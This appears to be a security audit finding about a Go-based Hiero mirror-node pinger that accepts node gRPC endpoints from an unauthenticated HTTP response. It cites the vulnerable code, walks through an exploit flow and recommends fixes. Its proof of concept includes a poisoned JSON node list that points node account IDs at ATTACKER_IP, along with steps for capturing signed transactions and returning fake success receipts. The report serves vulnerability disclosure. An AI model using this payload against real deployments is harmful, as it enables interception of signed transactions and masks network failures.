### Title
Unauthenticated Mirror REST Response Enables Full Network Map Poisoning in `buildNetworkFromMirrorNodes`

### Summary
`fetchMirrorNodeNetwork` in `pinger/mirror_node_client.go` fetches node topology over a plain HTTP connection and blindly maps every returned `service_endpoint` host:port to its claimed `node_account_id` with zero validation. Any attacker who can intercept or serve the HTTP response — via MITM on an unencrypted link, DNS hijacking, or operating a malicious mirror node — can inject arbitrary gRPC endpoints mapped to any node account ID, causing `hiero.ClientForNetwork(netmap)` to route the pinger's signed transactions to attacker-controlled infrastructure.

### Finding Description
**Code path:** `pinger/mirror_node_client.go`, `fetchMirrorNodeNetwork`, lines 100–124. [1](#0-0) 

The function performs a plain `http.Get` to `cfg.mirrorRest` (no TLS enforcement, no certificate pinning). [2](#0-1) 

The JSON response is decoded directly into `nodesEnvelope` and every `serviceEndpoint` entry is accepted: [3](#0-2) 

The only guards are `host == ""` and `ep.Port == 0`. There is no:
- IP allowlist or range check
- Domain name validation against a known set
- TLS/certificate verification of the mirror REST server
- Cryptographic signature over the node list
- Cross-check against an on-chain or hardcoded node registry

The resulting `map[string]hiero.AccountID` is passed directly to `hiero.ClientForNetwork(netmap)`: [4](#0-3) 

**Root cause:** The code assumes the HTTP endpoint at `cfg.mirrorRest` is trustworthy and returns authentic topology data. This assumption is not enforced by any transport or application-layer control.

**Exploit flow:**
1. Attacker positions themselves to intercept or serve the HTTP response (see Likelihood section).
2. They return a `nodesEnvelope` where some `nodeEntry` items carry legitimate `service_endpoints` and others carry attacker-controlled `host:port` values, all mapped to valid-looking `node_account_id` strings.
3. `fetchMirrorNodeNetwork` builds a partially or fully poisoned `netmap`.
4. `hiero.ClientForNetwork(netmap)` distributes outgoing gRPC calls across all entries in the map.
5. Transactions routed to attacker nodes are received in plaintext (gRPC without mutual TLS), can be dropped, replayed, or responded to with fabricated receipts.

### Impact Explanation
- **Transaction interception:** The pinger's signed transactions (including operator key usage, account IDs, amounts) are sent to attacker-controlled gRPC endpoints.
- **Selective transaction dropping:** The attacker can silently discard transactions routed to their nodes, causing the pinger to report false network failures or mask real ones.
- **Fabricated receipts:** An attacker-controlled node can return a success receipt for a transaction it never forwarded to consensus, causing the pinger to report a healthy network when it is not.
- **Operator key exposure risk:** The signed transaction bytes, including the operator's private-key signature, are transmitted to the attacker's endpoint.

Note: True ledger-level "history reorganization" (reordering committed transactions) is not achievable this way — Hedera's hashgraph consensus is not controlled by individual nodes. The realistic impact is transaction interception, DoS via dropping, and false health reporting.

### Likelihood Explanation
The `mirrorRest` URL defaults to `http://mirror-rest:5551` — plain HTTP with no TLS. [5](#0-4) 

In a containerized/Kubernetes deployment (the repo ships a `Dockerfile` and `build.gradle.kts`), an attacker who can:
- Poison the internal DNS entry for `mirror-rest` (e.g., via a compromised sidecar or misconfigured CoreDNS),
- Perform ARP/ICMP redirect on the pod network,
- Or simply operate a malicious mirror node that the operator points `HIERO_MIRROR_PINGER_REST` at,

…can fully exploit this without any OS-level privileges on the pinger host. The `network=other` path is explicitly designed for custom/private networks where the mirror node operator may not be fully trusted.

### Recommendation
1. **Enforce HTTPS** for `cfg.mirrorRest` and reject plain HTTP URLs at config validation time.
2. **Pin the mirror node's TLS certificate** or CA, so a MITM cannot present a fraudulent certificate.
3. **Validate returned endpoints** against a configurable allowlist of known IP ranges or domain suffixes before adding them to the network map.
4. **Cross-check node account IDs** against a hardcoded or separately-fetched authoritative list (e.g., from the Hiero address book) rather than trusting the mirror node's self-reported topology entirely.
5. Consider fetching the address book directly from a consensus node (which is authenticated by the SDK) instead of from the mirror REST API.

### Proof of Concept
**Preconditions:**
- Pinger is configured with `HIERO_MIRROR_PINGER_NETWORK=other` and `HIERO_MIRROR_PINGER_REST=http://mirror-rest:5551`.
- Attacker can intercept HTTP traffic to `mirror-rest:5551` (e.g., DNS hijack in the same Kubernetes namespace).

**Steps:**
1. Stand up a malicious HTTP server at the hijacked address that serves:
```json
{
  "nodes": [
    {
      "node_account_id": "0.0.3",
      "service_endpoints": [
        {"ip_address_v4": "34.94.106.61", "port": 50211},
        {"ip_address_v4": "ATTACKER_IP", "port": 50211}
      ]
    },
    {
      "node_account_id": "0.0.4",
      "service_endpoints": [
        {"ip_address_v4": "ATTACKER_IP", "port": 50212}
      ]
    }
  ],
  "links": {"next": null}
}
```
2. The pinger starts, calls `buildNetworkFromMirrorNodes`, and `fetchMirrorNodeNetwork` builds:
   - `34.94.106.61:50211 → 0.0.3` (legitimate)
   - `ATTACKER_IP:50211 → 0.0.3` (poisoned)
   - `ATTACKER_IP:50212 → 0.0.4` (poisoned)
3. `hiero.ClientForNetwork(netmap)` distributes transactions across all three entries.
4. On `ATTACKER_IP`, run a gRPC listener that logs received `Transaction` protobufs and returns `SUCCESS` receipts.
5. Observe that a fraction of the pinger's signed transactions (with full operator signature) arrive at the attacker's server; the pinger reports no errors.

### Citations

**File:** pinger/mirror_node_client.go (L79-87)
```go
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, url, nil)
	if err != nil {
		return nil, false, err
	}

	resp, err := httpClient.Do(req)
	if err != nil {
		return nil, true, fmt.Errorf("GET %s failed: %w", url, err)
	}
```

**File:** pinger/mirror_node_client.go (L100-124)
```go
	network := make(map[string]hiero.AccountID)

	for _, n := range payload.Nodes {
		if n.NodeAccountID == "" {
			continue
		}

		nodeAccountId, err := hiero.AccountIDFromString(n.NodeAccountID)
		if err != nil {
			continue
		}

		// Use service_endpoints for node gRPC (what the SDK wants)
		for _, ep := range n.ServiceEndpoints {
			host := strings.TrimSpace(ep.DomainName)
			if host == "" {
				host = strings.TrimSpace(ep.IPAddressV4)
			}
			if host == "" || ep.Port == 0 {
				continue
			}

			addr := net.JoinHostPort(host, fmt.Sprintf("%d", ep.Port))
			network[addr] = nodeAccountId
		}
```

**File:** pinger/sdk_client.go (L18-22)
```go
		netmap, err := buildNetworkFromMirrorNodes(context.Background(), cfg)
		if err != nil {
			return nil, err
		}
		client = hiero.ClientForNetwork(netmap)
```

**File:** pinger/config.go (L37-37)
```go
	flag.StringVar(&cfg.mirrorRest, "mirror-rest", envOr("HIERO_MIRROR_PINGER_REST", ""), "mirror node REST base URL (required for other), e.g. http://mirror-rest:5551")
```
